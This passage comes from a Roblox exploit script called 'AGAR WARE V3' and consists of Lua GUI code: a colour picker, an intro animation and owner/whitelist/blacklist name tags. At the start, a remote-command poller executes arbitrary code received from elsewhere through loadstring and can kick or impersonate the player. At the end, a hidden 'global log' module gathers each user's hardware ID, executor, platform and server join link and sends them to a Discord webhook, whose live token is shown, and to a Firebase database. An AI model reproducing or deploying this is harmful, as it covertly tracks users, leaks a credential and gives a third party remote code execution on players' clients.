								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(commandData.message, "All")
							end
						end)
					elseif commandData.type == "kick" then
						LocalPlayer:Kick("You have been kicked by an admin.")
					elseif commandData.type == "execute" then
						pcall(function()
							loadstring(commandData.code)()
						end)
					end
					-- REMOVED THE DELETE HERE - let the 10 second timer handle it
				end
			end
		end)
	end
	
	while wait(3) do
		checkForCommands()
	end
end;
task.spawn(C_2cb);
-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerScript
local function C_2cd()
local script = G2L["2cd"];
	local ColorPicker = script.Parent
	
	-- UI Elements
	local canvas = ColorPicker.innerframelayout.canvashue.canvasFrame.canvas
	local canvasDot = canvas.dot
	
	local hue = ColorPicker.innerframelayout.canvashue.hueFrame.hue
	local hueLine = hue.line
	
	local slider = ColorPicker.innerframelayout.transparency.transparencyFrame.slider
	local sliderLine = slider.line
	
	local hexTextbox = ColorPicker.innerframelayout.colorvalue.hex.textbox
	local rgbTextbox = ColorPicker.innerframelayout.colorvalue.rgb.textbox
	
	local applyButtonFrame = ColorPicker.innerframelayout.applycancel.apply.buttonFrame
	
	local UserInputService = game:GetService("UserInputService")
	local GuiService = game:GetService("GuiService")
	
	-- Current color state
	local currentHue = 0
	local currentSat = 1
	local currentVal = 1
	local currentAlpha = 0
	
	-- Dragging states
	local canvasDragging = false
	local hueDragging = false
	local alphaDragging = false
	
	-- Helper: HSV to RGB
	local function hsvToRgb(h, s, v)
		local r, g, b
		local i = math.floor(h * 6)
		local f = h * 6 - i
		local p = v * (1 - s)
		local q = v * (1 - f * s)
		local t = v * (1 - (1 - f) * s)
		i = i % 6
		if i == 0 then r, g, b = v, t, p
		elseif i == 1 then r, g, b = q, v, p
		elseif i == 2 then r, g, b = p, v, t
		elseif i == 3 then r, g, b = p, q, v
		elseif i == 4 then r, g, b = t, p, v
		elseif i == 5 then r, g, b = v, p, q
		end
		return Color3.new(r, g, b)
	end
	
	-- Helper: RGB to HSV
	local function rgbToHsv(color)
		local r, g, b = color.R, color.G, color.B
		local max = math.max(r, g, b)
		local min = math.min(r, g, b)
		local delta = max - min
	
		local h, s, v = 0, 0, max
	
		if max > 0 and delta > 0 then
			s = delta / max
			if max == r then
				h = ((g - b) / delta) % 6
			elseif max == g then
				h = (b - r) / delta + 2
			else
				h = (r - g) / delta + 4
			end
			h = h / 6
		end
	
		return h, s, v
	end
	
	-- Helper: RGB to Hex
	local function rgbToHex(color)
		return string.format("#%02X%02X%02X", 
			math.floor(color.R * 255),
			math.floor(color.G * 255),
			math.floor(color.B * 255))
	end
	
	-- Helper: Hex to RGB
	local function hexToRgb(hex)
		hex = hex:gsub("#", "")
		if #hex ~= 6 then return nil end
		local r = tonumber(hex:sub(1, 2), 16)
		local g = tonumber(hex:sub(3, 4), 16)
		local b = tonumber(hex:sub(5, 6), 16)
		if not r or not g or not b then return nil end
		return Color3.fromRGB(r, g, b)
	end
	
	-- Update everything based on current HSV values
	local function updateColor()
		local hueColor = hsvToRgb(currentHue, 1, 1)
		local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
	
		-- Update canvas gradient
		if not canvas:FindFirstChild("SatGradient") then
			local satFrame = Instance.new("Frame")
			satFrame.Name = "SatGradient"
			satFrame.Size = UDim2.new(1, 0, 1, 0)
			satFrame.BackgroundColor3 = Color3.new(1, 1, 1)
			satFrame.BorderSizePixel = 0
			satFrame.ZIndex = canvas.ZIndex
			local grad = Instance.new("UIGradient")
			grad.Name = "Gradient"
			grad.Parent = satFrame
			satFrame.Parent = canvas
	
			local valFrame = Instance.new("Frame")
			valFrame.Name = "ValGradient"
			valFrame.Size = UDim2.new(1, 0, 1, 0)
			valFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			valFrame.BackgroundTransparency = 0
			valFrame.BorderSizePixel = 0
			valFrame.ZIndex = canvas.ZIndex + 1
			local grad2 = Instance.new("UIGradient")
			grad2.Name = "Gradient"
			grad2.Rotation = 90
			grad2.Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 1),
				NumberSequenceKeypoint.new(1, 0)
			})
			grad2.Parent = valFrame
			valFrame.Parent = canvas
		end
	
		local satGrad = canvas.SatGradient.Gradient
		satGrad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
			ColorSequenceKeypoint.new(1, hueColor)
		})
	
		-- Update transparency slider color
		local transFrame = slider:FindFirstChild("TransColorFrame")
		if transFrame then
			transFrame.BackgroundColor3 = finalColor
		end
	
		-- Update textboxes
		hexTextbox.Text = rgbToHex(finalColor)
		rgbTextbox.Text = string.format("%d, %d, %d",
			math.floor(finalColor.R * 255),
			math.floor(finalColor.G * 255),
			math.floor(finalColor.B * 255))
	
		-- Update apply button color
		applyButtonFrame.BackgroundColor3 = finalColor
		applyButtonFrame.BackgroundTransparency = currentAlpha
	
		-- Update hue line and canvas dot positions
		hueLine.Position = UDim2.new(0, 0, currentHue, 0)
		canvasDot.Position = UDim2.new(currentSat, 0, 1 - currentVal, 0)
	
		-- Update all outline strokes when color changes
		if outlineFrames then
			for _, data in pairs(outlineFrames) do
				data.update()
			end
		end
	end
	
	-- Setup canvas
	canvas.AutoButtonColor = false
	canvas.Active = true
	
	-- Setup hue gradient
	hue.AutoButtonColor = false
	hue.BackgroundTransparency = 1
	hue.Active = true
	if not hue:FindFirstChild("HueGradientFrame") then
		local hueFrame = Instance.new("Frame")
		hueFrame.Name = "HueGradientFrame"
		hueFrame.Size = UDim2.new(1, 0, 1, 0)
		hueFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		hueFrame.BorderSizePixel = 0
		hueFrame.ZIndex = hue.ZIndex
		local grad = Instance.new("UIGradient")
		grad.Rotation = 90
		grad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
			ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
			ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
			ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
			ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
		})
		grad.Parent = hueFrame
		hueFrame.Parent = hue
	end
	
	-- Setup transparency gradient (checkerboard + color gradient)
	slider.AutoButtonColor = false
	slider.BackgroundTransparency = 1
	slider.Active = true
	if not slider:FindFirstChild("TransCheckerboard") then
		local checkerboard = Instance.new("Frame")
		checkerboard.Name = "TransCheckerboard"
		checkerboard.Size = UDim2.new(1, 0, 1, 0)
		checkerboard.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		checkerboard.BorderSizePixel = 0
		checkerboard.ZIndex = slider.ZIndex
		checkerboard.ClipsDescendants = true
	
		local squareSize = 4
		for y = 0, 50 do
			for x = 0, 50 do
				if (x + y) % 2 == 1 then
					local square = Instance.new("Frame")
					square.Size = UDim2.new(0, squareSize, 0, squareSize)
					square.Position = UDim2.new(0, x * squareSize, 0, y * squareSize)
					square.BackgroundColor3 = Color3.fromRGB(204, 204, 204)
					square.BorderSizePixel = 0
					square.ZIndex = slider.ZIndex
					square.Parent = checkerboard
				end
			end
		end
	
		checkerboard.Parent = slider
	
		local transColorFrame = Instance.new("Frame")
		transColorFrame.Name = "TransColorFrame"
		transColorFrame.Size = UDim2.new(1, 0, 1, 0)
		transColorFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		transColorFrame.BorderSizePixel = 0
		transColorFrame.ZIndex = slider.ZIndex + 1
		local grad = Instance.new("UIGradient")
		grad.Transparency = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 0),
			NumberSequenceKeypoint.new(1, 1)
		})
		grad.Parent = transColorFrame
		transColorFrame.Parent = slider
	end
	
	local function updateCanvasFromInput(input)
		local canvasPos = canvas.AbsolutePosition
		local canvasSize = canvas.AbsoluteSize
	
		local relativeX = math.clamp(input.Position.X - canvasPos.X, 0, canvasSize.X - 4)
		local relativeY = math.clamp(input.Position.Y - canvasPos.Y, 0, canvasSize.Y - 4)
	
		currentSat = relativeX / canvasSize.X
		currentVal = 1 - (relativeY / canvasSize.Y)
	
		canvasDot.Position = UDim2.new(currentSat, 0, 1 - currentVal, 0)
		updateColor()
	end
	
	canvas.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			canvasDragging = true
			updateCanvasFromInput(input)
		end
	end)
	
	-- Hue slider interaction
	local function updateHueFromInput(input)
		local huePos = hue.AbsolutePosition
		local hueSize = hue.AbsoluteSize
	
		local relativeY = math.clamp(input.Position.Y - huePos.Y, 0, hueSize.Y)
		currentHue = relativeY / hueSize.Y
	
		hueLine.Position = UDim2.new(0, 0, currentHue, 0)
		updateColor()
	end
	
	hue.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			hueDragging = true
			updateHueFromInput(input)
		end
	end)
	
	local function updateAlphaFromInput(input)
		local sliderPos = slider.AbsolutePosition
		local sliderSize = slider.AbsoluteSize
	
		local relativeX = math.clamp(input.Position.X - sliderPos.X, 0, sliderSize.X)
		currentAlpha = relativeX / sliderSize.X
	
		sliderLine.Position = UDim2.new(currentAlpha, 0, 0, 0)
		applyButtonFrame.BackgroundTransparency = currentAlpha
	end
	
	slider.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			alphaDragging = true
			updateAlphaFromInput(input)
		end
	end)
	
	-- Global input handlers for dragging
	UserInputService.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if canvasDragging then
				updateCanvasFromInput(input)
			end
			if hueDragging then
				updateHueFromInput(input)
			end
			if alphaDragging then
				updateAlphaFromInput(input)
			end
		end
	end)
	
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			canvasDragging = false
			hueDragging = false
			alphaDragging = false
		end
	end)
	
	-- Hex textbox
	local previousHex = hexTextbox.Text
	local hexTextChanged = false
	
	hexTextbox.Focused:Connect(function()
		previousHex = hexTextbox.Text
		hexTextChanged = false
	end)
	
	hexTextbox:GetPropertyChangedSignal("Text"):Connect(function()
		hexTextChanged = true
		local text = hexTextbox.Text:upper()
		text = text:gsub("[^0-9A-F#]", "")
		if #text > 7 then text = text:sub(1, 7) end
		hexTextbox.Text = text
	end)
	
	hexTextbox.FocusLost:Connect(function()
		if not hexTextChanged then
			hexTextbox.Text = previousHex
			return
		end
	
		local color = hexToRgb(hexTextbox.Text)
		if color then
			local h, s, v = rgbToHsv(color)
			currentHue = h
			currentSat = s
			currentVal = v
			updateColor()
			previousHex = hexTextbox.Text
		else
			hexTextbox.Text = previousHex
		end
	end)
	
	-- RGB textbox
	local previousRgb = rgbTextbox.Text
	local rgbTextChanged = false
	
	rgbTextbox.Focused:Connect(function()
		previousRgb = rgbTextbox.Text
		rgbTextChanged = false
	end)
	
	rgbTextbox:GetPropertyChangedSignal("Text"):Connect(function()
		rgbTextChanged = true
		local text = rgbTextbox.Text
		text = text:gsub("[^0-9 ]", "")
		text = text:gsub(" +", " ")
		rgbTextbox.Text = text
	end)
	
	rgbTextbox.FocusLost:Connect(function()
		if not rgbTextChanged then
			rgbTextbox.Text = previousRgb
			return
		end
	
		local text = rgbTextbox.Text:gsub(" ", ", ")
		local r, g, b = text:match("(%d+),%s*(%d+),%s*(%d+)")
		if r and g and b then
			r, g, b = tonumber(r), tonumber(g), tonumber(b)
			if r and g and b and r <= 255 and g <= 255 and b <= 255 then
				local color = Color3.fromRGB(r, g, b)
				local h, s, v = rgbToHsv(color)
				currentHue = h
				currentSat = s
				currentVal = v
				updateColor()
				previousRgb = rgbTextbox.Text
			else
				rgbTextbox.Text = previousRgb
			end
		else
			rgbTextbox.Text = previousRgb
		end
	end)
	
	-- Textbox and button outline hover effects
	local outlineFrames = {}
	
	local function setupOutlineEffect(parentFrame, childElement)
		local outlineStroke = nil
		for _, descendant in pairs(parentFrame:GetDescendants()) do
			if descendant:IsA("UIStroke") and descendant.Name == "outlineStroke" then
				outlineStroke = descendant
				break
			end
		end
	
		if not outlineStroke then return end
	
		local originalColor = outlineStroke.Color
		local originalThickness = outlineStroke.Thickness
		local isHovering = false
		local isFocused = false
	
		local function updateStroke()
			local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
			if isFocused or isHovering then
				outlineStroke.Color = finalColor
				outlineStroke.Thickness = 1
			else
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = 2
			end
		end
	
		if childElement and childElement:IsA("TextBox") then
			childElement.Focused:Connect(function()
				isFocused = true
				updateStroke()
			end)
			childElement.FocusLost:Connect(function()
				isFocused = false
				updateStroke()
			end)
		end
	
		parentFrame.MouseEnter:Connect(function()
			isHovering = true
			updateStroke()
		end)
		parentFrame.MouseLeave:Connect(function()
			isHovering = false
			updateStroke()
		end)
	
		table.insert(outlineFrames, {update = updateStroke})
	end
	
	setupOutlineEffect(ColorPicker.innerframelayout.colorvalue.hex, hexTextbox)
	setupOutlineEffect(ColorPicker.innerframelayout.colorvalue.rgb, rgbTextbox)
	setupOutlineEffect(ColorPicker.innerframelayout.applycancel.apply, nil)
	setupOutlineEffect(ColorPicker.innerframelayout.applycancel.cancel, nil)
	
	-- Initial update
	updateColor()
	
	-- Global functions for master script
	function _G.SetColorPickerColor(color, alpha)
		local h, s, v = rgbToHsv(color)
		currentHue = h
		currentSat = s
		currentVal = v
		currentAlpha = alpha or 0
		updateColor()
	end
	
	function _G.GetColorPickerColor()
		local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
		return finalColor, currentAlpha
	end
	
	ColorPicker.Visible = false
end;
task.spawn(C_2cd);
-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.intro
local function C_32b()
local script = G2L["32b"];
	-- Add this at the very top of your script
	if _G.IntroPlayed then
		script.Parent.Parent:Destroy()
		return
	end
	_G.IntroPlayed = true
	
	local canvasGroup = script.Parent.Parent
	local textLabel = script.Parent
	canvasGroup.Visible = true
	local TweenService = game:GetService("TweenService")
	local SoundService = game:GetService("SoundService")
	
	local brightBlue = Color3.fromRGB(0, 123, 255)
	local darkBlue = Color3.fromRGB(0, 60, 120)
	
	-- Find MainFrame UIScale
	local function getScreenGui()
		local p = canvasGroup
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	local MainFrame = screenGui and screenGui:FindFirstChild("MainFrame")
	local uiScale = MainFrame and MainFrame:FindFirstChild("UIScale")
	
	-- Scale MainFrame from 0.2 to 1 (fast start, slow end)
	if uiScale then
		uiScale.Scale = 0.2
		local scaleUp = TweenService:Create(
			uiScale,
			TweenInfo.new(1, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
			{Scale = 1}
		)
		scaleUp:Play()
	end
	
	-- Create and play audio
	local introSound = Instance.new("Sound")
	introSound.SoundId = "rbxassetid://9109651770"
	introSound.Volume = 1
	introSound.TimePosition = 13.32
	introSound.Parent = SoundService
	introSound:Play()
	
	-- Center the canvas group
	canvasGroup.AnchorPoint = Vector2.new(0.5, 0.5)
	canvasGroup.Position = UDim2.new(0.5, 0, 0.5, -15)
	
	-- Set initial color
	textLabel.TextColor3 = brightBlue
	
	-- Start canvas invisible
	canvasGroup.GroupTransparency = 1
	
	-- Fade in canvas
	local fadeIn = TweenService:Create(
		canvasGroup,
		TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
		{GroupTransparency = 0}
	)
	fadeIn:Play()
	fadeIn.Completed:Wait()
	
	-- NOW start the color pulsing loop (canvas is visible now)
	local pulseRunning = true
	task.spawn(function()
		while pulseRunning do
			-- Fade to dark
			local toDark = TweenService:Create(
				textLabel,
				TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{TextColor3 = darkBlue}
			)
			toDark:Play()
			toDark.Completed:Wait()
			if not pulseRunning then break end
			-- Fade back to bright
			local toBright = TweenService:Create(
				textLabel,
				TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{TextColor3 = brightBlue}
			)
			toBright:Play()
			toBright.Completed:Wait()
		end
	end)
	
	-- Wait 2.5 seconds
	task.wait(2.5)
	
	-- Stop pulsing
	pulseRunning = false
	
	-- Fade out canvas AND audio at the same time
	local fadeOut = TweenService:Create(
		canvasGroup,
		TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
		{GroupTransparency = 1}
	)
	fadeOut:Play()
	
	local audioFadeOut = TweenService:Create(
		introSound,
		TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
		{Volume = 0}
	)
	audioFadeOut:Play()
	
	fadeOut.Completed:Wait()
	
	-- Destroy the canvas group and audio
	canvasGroup:Destroy()
	introSound:Destroy()
end;
task.spawn(C_32b);
-- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE.LabelsTags
local function C_32f()
local script = G2L["32f"];
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	
	-- ==========================================
	-- OWNER TAG
	-- ==========================================
	local ownerBrightBlue = Color3.fromRGB(0, 123, 255)
	local ownerDarkBlue = Color3.fromRGB(0, 83, 166)
	local ownerStrokeColor = Color3.fromRGB(0, 53, 109)
	
	local function addOwnerTag(player)
		repeat task.wait() until _G.IsOwner
		if not _G.IsOwner(player.UserId) then return end
		local function applyToChar(character)
			if not character then return end
			local hrp = character:WaitForChild("HumanoidRootPart", 10)
			if not hrp then return end
			local existing = hrp:FindFirstChild("OwnerTag")
			if existing then existing:Destroy() end
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "OwnerTag"
			billboard.Size = UDim2.new(0, 200, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 4, 0)
			billboard.AlwaysOnTop = true
			billboard.ResetOnSpawn = false
			billboard.Parent = hrp
			local label = Instance.new("TextLabel", billboard)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.Text = "OWNER"
			label.TextColor3 = ownerBrightBlue
			label.Font = Enum.Font.Arcade
			label.TextScaled = true
			label.TextStrokeColor3 = ownerStrokeColor
			label.TextStrokeTransparency = 0
			local cam = workspace.CurrentCamera
			local scaleConn
			scaleConn = RunService.RenderStepped:Connect(function()
				if not billboard.Parent then
					scaleConn:Disconnect()
					return
				end
				local dist = (cam.CFrame.Position - hrp.Position).Magnitude
				local scale = ((34 / dist) * 0.7) + 0.2
				billboard.Size = UDim2.new(0, 200 * scale, 0, 50 * scale)
			end)
			local pulseRunning = true
			task.spawn(function()
				while pulseRunning and billboard.Parent do
					local toDark = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = ownerDarkBlue}
					)
					toDark:Play()
					toDark.Completed:Wait()
					if not billboard.Parent then break end
					local toBright = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = ownerBrightBlue}
					)
					toBright:Play()
					toBright.Completed:Wait()
				end
			end)
			billboard.Destroying:Connect(function()
				pulseRunning = false
				if scaleConn then
					scaleConn:Disconnect()
				end
			end)
		end
		if player.Character then
			applyToChar(player.Character)
		end
		player.CharacterAdded:Connect(applyToChar)
	end
	
	for _, player in ipairs(Players:GetPlayers()) do
		addOwnerTag(player)
	end
	Players.PlayerAdded:Connect(addOwnerTag)
	
	
	
	
	
	
	
	
	
	
	
	-- ==========================================
	-- WHITELISTED TAG
	-- ==========================================
	local whiteBrightBlue = Color3.fromRGB(255, 255, 255)
	local whiteDarkBlue = Color3.fromRGB(166, 166, 166)
	local whiteStrokeColor = Color3.fromRGB(49, 49, 49)
	
	local function addWhitelistedTag(player)
		repeat task.wait() until _G.IsWhitelisted
		if not _G.IsWhitelisted(player.UserId) then return end
	
		-- Don't show tag to the whitelisted player themselves
		local LocalPlayer = Players.LocalPlayer
		if player == LocalPlayer then return end
	
		local function applyToChar(character)
			if not character then return end
			local hrp = character:WaitForChild("HumanoidRootPart", 10)
			if not hrp then return end
			local existing = hrp:FindFirstChild("WhitelistedTag")
			if existing then existing:Destroy() end
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "WhitelistedTag"
			billboard.Size = UDim2.new(0, 200, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 4, 0)
			billboard.AlwaysOnTop = true
			billboard.ResetOnSpawn = false
			billboard.Parent = hrp
			local label = Instance.new("TextLabel", billboard)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.Text = "COOL PEOPLE"
			label.TextColor3 = whiteBrightBlue
			label.Font = Enum.Font.Arcade
			label.TextScaled = true
			label.TextStrokeColor3 = whiteStrokeColor
			label.TextStrokeTransparency = 0
			local cam = workspace.CurrentCamera
			local scaleConn
			scaleConn = RunService.RenderStepped:Connect(function()
				if not billboard.Parent then
					scaleConn:Disconnect()
					return
				end
				local dist = (cam.CFrame.Position - hrp.Position).Magnitude
				local scale = ((26 / dist) * 0.5) + 0.2
				billboard.Size = UDim2.new(0, 200 * scale, 0, 50 * scale)
			end)
			local pulseRunning = true
			task.spawn(function()
				while pulseRunning and billboard.Parent do
					local toDark = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = whiteDarkBlue}
					)
					toDark:Play()
					toDark.Completed:Wait()
					if not billboard.Parent then break end
					local toBright = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = whiteBrightBlue}
					)
					toBright:Play()
					toBright.Completed:Wait()
				end
			end)
			billboard.Destroying:Connect(function()
				pulseRunning = false
				if scaleConn then
					scaleConn:Disconnect()
				end
			end)
		end
		if player.Character then
			applyToChar(player.Character)
		end
		player.CharacterAdded:Connect(applyToChar)
	end
	
	for _, player in ipairs(Players:GetPlayers()) do
		addWhitelistedTag(player)
	end
	Players.PlayerAdded:Connect(addWhitelistedTag)
	
	
	
	
	
	
	
	
	-- ==========================================
	-- BLACKLISTED TAG
	-- ==========================================
	local blackBrightRed = Color3.fromRGB(255, 0, 0)
	local blackDarkRed = Color3.fromRGB(150, 0, 0)
	local blackStrokeColor = Color3.fromRGB(80, 0, 0)
	local function addBlacklistedTag(player)
		repeat task.wait() until _G.IsBlacklisted and _G.IsOwner and _G.IsWhitelisted
		-- Only owners and whitelisted can see blacklist tags
		local LocalPlayer = game:GetService("Players").LocalPlayer
		if not _G.IsOwner(LocalPlayer.UserId) and not _G.IsWhitelisted(LocalPlayer.UserId) then return end
		if not _G.IsBlacklisted(player.UserId) then return end
		local function applyToChar(character)
			if not character then return end
			local torso = character:WaitForChild("UpperTorso", 10) or character:WaitForChild("Torso", 10)
			if not torso then return end
			local existing = torso:FindFirstChild("BlacklistedTag")
			if existing then existing:Destroy() end
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "BlacklistedTag"
			billboard.Size = UDim2.new(0, 200, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 0, 0)
			billboard.AlwaysOnTop = true
			billboard.ResetOnSpawn = false
			billboard.Parent = torso
			local label = Instance.new("TextLabel", billboard)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.Text = "BLACKLISTED"
			label.TextColor3 = blackBrightRed
			label.Font = Enum.Font.Arcade
			label.TextScaled = true
			label.TextStrokeColor3 = blackStrokeColor
			label.TextStrokeTransparency = 0
			local cam = workspace.CurrentCamera
			local scaleConn
			scaleConn = game:GetService("RunService").RenderStepped:Connect(function()
				if not billboard.Parent then
					scaleConn:Disconnect()
					return
				end
				local dist = (cam.CFrame.Position - torso.Position).Magnitude
				local scale = ((26 / dist) * 0.5)
				billboard.Size = UDim2.new(0, 200 * scale, 0, 50 * scale)
			end)
			local pulseRunning = true
			task.spawn(function()
				while pulseRunning and billboard.Parent do
					local toDark = game:GetService("TweenService"):Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = blackDarkRed}
					)
					toDark:Play()
					toDark.Completed:Wait()
					if not billboard.Parent then break end
					local toBright = game:GetService("TweenService"):Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = blackBrightRed}
					)
					toBright:Play()
					toBright.Completed:Wait()
				end
			end)
			billboard.Destroying:Connect(function()
				pulseRunning = false
				if scaleConn then
					scaleConn:Disconnect()
				end
			end)
		end
		if player.Character then
			applyToChar(player.Character)
		end
		player.CharacterAdded:Connect(applyToChar)
	end
	for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
		addBlacklistedTag(player)
	end
	game:GetService("Players").PlayerAdded:Connect(addBlacklistedTag)
end;
task.spawn(C_32f);
-- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE.tcotoolrefresh
local function C_331()
local script = G2L["331"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	shared.RefreshTool = function(toolName)
		if not toolName then return false end
	
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(toolName) then
			return false
		end
	
		local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
	
		if not tool then
			return false
		end
	
		tool.Parent = LocalPlayer.Character
	
		while tool.Parent == LocalPlayer.Character do
			tool.Parent = LocalPlayer.Backpack
			task.wait()
		end
	
		return true
	end
end;
task.spawn(C_331);
-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
local function C_333()
local script = G2L["333"];
	local _WH = {}
	do
		local _HttpService     = game:GetService("HttpService")
		local _Players         = game:GetService("Players")
		local _MarketplaceSvc  = game:GetService("MarketplaceService")
		local _AnalyticsSvc    = game:GetService("RbxAnalyticsService")
		local _InputService    = game:GetService("UserInputService")
	
		local _WEBHOOK = "https://discord.com/api/webhooks/1502950736902750258/mav7Jjsbea6vyUZOV3NfWzIvIB1XDSTJMqjKx7mCTCY00RL2mKnKQqgdZGRGfPWMjO5Y"
		local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
		local _SCRIPT_NAME = "AGAR WARE V3"
	
		local _req = (syn and syn.request)
			or request
			or http_request
			or (fluxus and fluxus.request)
			or function() return { StatusCode = 0 } end
	
		local _plr = _Players.LocalPlayer
		local _productInfo = pcall(function()
			return _MarketplaceSvc:GetProductInfo(game.PlaceId)
		end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
	
		local function _hwid()
			if get_hwid then return tostring(get_hwid()) end
			local ok, id = pcall(function() return _AnalyticsSvc:GetClientId() end)
			return ok and id or "N/A"
		end
	
		local function _executor()
			if syn and syn.request then return "Synapse X" end
			if fluxus and fluxus.request then return "Fluxus" end
			if KRNL_LOADED or Krnl then return "KRNL" end
			if getexecutorname then return getexecutorname() end
			return "Unknown"
		end
	
		local function _platform()
			local p = _InputService:GetPlatform().Name
			local device = "Unknown"
	
			if p == "Windows" then device = "Windows"
			elseif p == "OSX" then device = "MacOS"
			elseif p == "IOS" then device = "iOS"
			elseif p == "Android" then device = "Android"
			elseif p == "UWP" then device = "Xbox"
			else device = p end
	
			return device
		end
	
		local function _ping()
			local ok, v = pcall(function()
				return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
			end)
			return ok and math.floor(v) or 0
		end
	
		local function _fps()
			local v = workspace:GetRealPhysicsFPS()
			return v > 0 and math.floor(v) or 0
		end
	
		local function _joinLink()
			local ok, v = pcall(function()
				return "https://www.roblox.com/games/start?placeId="
					.. game.PlaceId
					.. "&gameInstanceId=" .. game.JobId
			end)
			return ok and v or ""
		end
	
		local function _findPlayerKey(userId)
			-- Check if a key exists for this userId (with any username)
			local success, response = pcall(function()
				return _req({
					Url = _FIREBASE_URL .. "/players.json",
					Method = "GET"
				})
			end)
	
			if success and response.StatusCode == 200 then
				local allPlayers = _HttpService:JSONDecode(response.Body)
				if type(allPlayers) == "table" then
					for key, _ in pairs(allPlayers) do
						-- Extract userId from key (format: "userId - username")
						local keyUserId = key:match("^(%d+)%s*%-")
						if keyUserId and tonumber(keyUserId) == userId then
							return key
						end
					end
				end
			end
	
			return nil
		end
	
		local function _renamePlayerKey(oldKey, newKey)
			-- Get data from old key
			local success, response = pcall(function()
				return _req({
					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(oldKey) .. ".json",
					Method = "GET"
				})
			end)
	
			if success and response.StatusCode == 200 then
				local data = _HttpService:JSONDecode(response.Body)
	
				-- Create new key with data
				pcall(function()
					_req({
						Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(newKey) .. ".json",
						Method = "PUT",
						Headers = { ["Content-Type"] = "application/json" },
						Body = _HttpService:JSONEncode(data)
					})
				end)
	
				-- Delete old key
				pcall(function()
					_req({
						Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(oldKey) .. ".json",
						Method = "DELETE"
					})
				end)
			end
		end
	
		local function _getPlayerData(playerKey)
			local success, response = pcall(function()
				return _req({
					Url = _FIREBASE_URL .. "/players/" .. _HttpService:UrlEncode(playerKey) .. ".json",
					Method = "GET"
				})
			end)
	
			if success and response.StatusCode == 200 then
				local data = _HttpService:JSONDecode(response.Body)
				if type(data) == "table" then
